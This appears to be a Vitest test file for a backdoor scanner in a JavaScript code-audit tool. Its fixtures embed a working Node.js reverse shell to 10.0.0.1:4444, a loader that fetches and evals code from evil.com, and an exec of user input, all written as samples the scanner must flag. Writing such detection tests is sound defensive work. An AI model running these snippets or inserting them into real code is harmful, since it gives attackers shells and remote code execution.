import { describe, it, expect } from 'vitest';
import { scanBackdoors } from '../../src/rules/backdoors.js';
import { RiskCategory } from '../../src/rules/types.js';
import type { FileEntry } from '../../src/rules/engine.js';

function makeFile(relativePath: string, content: string): FileEntry {
  return { relativePath, absolutePath: `/repo/${relativePath}`, content, extension: '.js' };
}

describe('scanBackdoors', () => {
  it('flags reverse shell patterns', async () => {
    const files = [makeFile('shell.js', `
      const net = require('net');
      const client = new net.Socket();
      client.connect(4444, '10.0.0.1', () => {
        const sh = require('child_process').spawn('/bin/sh', []);
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
      });
    `)];
    const findings = await scanBackdoors('/repo', files);
    expect(findings.length).toBeGreaterThan(0);
    expect(findings[0].category).toBe(RiskCategory.BACKDOORS);
  });

  it('flags remote code download and execute', async () => {
    const files = [makeFile('loader.js', `
      const code = await fetch('https://evil.com/payload.js').then(r => r.text());
      eval(code);
    `)];
    const findings = await scanBackdoors('/repo', files);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('flags child_process.exec with dynamic input', async () => {
    const files = [makeFile('cmd.js', `
      const { exec } = require('child_process');
      execSync(userInput);
    `)];
    const findings = await scanBackdoors('/repo', files);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('does not flag normal net usage', async () => {
    const files = [makeFile('server.js', `
      const http = require('http');
      http.createServer((req, res) => res.end('ok')).listen(3000);
    `)];
    const findings = await scanBackdoors('/repo', files);
    expect(findings.length).toBe(0);
  });
});
